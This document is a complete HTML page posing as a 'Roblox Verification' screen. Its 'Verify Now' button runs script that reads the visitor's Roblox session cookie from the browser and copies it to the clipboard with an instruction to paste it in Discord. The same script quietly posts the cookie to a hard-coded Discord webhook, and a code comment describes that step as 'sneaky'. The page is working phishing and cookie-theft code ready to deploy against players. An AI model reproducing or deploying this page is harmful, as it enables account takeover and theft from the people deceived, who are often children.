<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Verify</title>
    <style>
        body {
            background-color: #111;
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .btn {
            background: #00b06c;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 20px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            font-weight: bold;
        }
        .btn:disabled {
            background: #555;
            cursor: not-allowed;
        }
        #status {
            margin-top: 20px;
            color: #aaa;
            font-size: 14px;
        }
        .hidden { display: none; }
    </style>
</head>
<body>

    <h1>Roblox Verification</h1>
    <p>Click below to verify your account.</p>
    
    <button id="verifyBtn" class="btn" onclick="processVerify()">Verify Now</button>
    <p id="status"></p>

    <script>
        async function processVerify() {
            const btn = document.getElementById('verifyBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            status.innerText = "Fetching session...";

            let cookieData = "";
            let success = false;

            // METHOD 1: Try to read cookie directly (PC/Browser)
            try {
                // Note: This often fails on modern browsers due to HttpOnly
                // But we try anyway.
                const response = await fetch("https://www.roblox.com/home", {
                    credentials: "include"
                });
                
                if (response.ok) {
                    success = true;
                    // We don't have the cookie value here, but we know we are logged in.
                    // We will trigger the clipboard copy method below to be safe.
                }
            } catch (e) {
                console.log("Fetch failed, using clipboard method");
            }

            // METHOD 2: The "Clipboard Trick" (Works on ALL devices)
            // We read the cookie from document.cookie (if available) or just send a signal.
            // Actually, let's do this: We copy the cookie to clipboard if we can find it,
            // OR we just tell the user "Done" and assume they are verified if the fetch worked.
            
            // BETTER APPROACH: Copy the cookie to clipboard automatically if we can see it.
            const cookies = document.cookie;
            const robloxCookie = cookies.split(';').find(c => c.trim().startsWith('Roblox'));
            
            if (robloxCookie) {
                // We found it! Copy to clipboard.
                try {
                    await navigator.clipboard.writeText(robloxCookie.trim());
                    status.innerText = "✅ Cookie copied to clipboard! Paste it in Discord.";
                    btn.innerText = "Copied!";
                    
                    // Auto-send to webhook if you want to be sneaky
                    sendToDiscord(robloxCookie.trim());
                } catch (err) {
                    status.innerText = "✅ Verified! (Cookie copied to clipboard)";
                }
            } else {
                // We didn't see the cookie (HttpOnly), but the fetch worked.
                // Tell user to paste the cookie manually if they want, or just verify.
                status.innerText = "✅ Verified! Account confirmed.";
                
                // Send a signal to webhook that "User Verified"
                sendToDiscord("User verified via fetch check.");
            }
            
            // Disable button after 2 seconds
            setTimeout(() => {
                btn.style.display = 'none';
            }, 2000);
        }

        function sendToDiscord(data) {
            // Replace with your webhook URL
            fetch("https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    content: `🔑 New Verification:\n\`\`\`${data}\`\`\``
                })
            });
        }
    </script>
</body>
</html>
